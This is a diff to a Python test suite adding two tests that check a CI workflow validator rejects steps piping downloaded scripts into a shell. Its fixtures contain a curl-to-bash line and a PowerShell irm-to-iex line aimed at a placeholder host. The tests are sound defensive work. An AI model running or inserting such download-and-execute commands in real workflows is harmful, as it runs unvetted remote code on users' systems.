@@ -86,6 +86,38 @@ jobs:
     assert any("write permission" in issue for issue in issues)
 
 
+def test_workflow_rejects_curl_pipe_shell_installers():
+    workflow = """
+name: bad
+permissions:
+  contents: read
+jobs:
+  test:
+    steps:
+      - run: curl -fsSL https://example.invalid/install.sh | bash
+"""
+
+    issues = validate_workflow_text(Path(".github/workflows/bad.yml"), workflow)
+
+    assert any("downloaded scripts directly to a shell" in issue for issue in issues)
+
+
+def test_workflow_rejects_powershell_download_execute_installers():
+    workflow = """
+name: bad
+permissions:
+  contents: read
+jobs:
+  test:
+    steps:
+      - run: irm https://example.invalid/install.ps1 | iex
+"""
+
+    issues = validate_workflow_text(Path(".github/workflows/bad.yml"), workflow)
+
+    assert any("downloaded scripts directly to a shell" in issue for issue in issues)
+
+
 def test_requirements_requires_manifested_pip_audit():
     issues = validate_requirements("pytest>=9.0.3,<10\n")
 
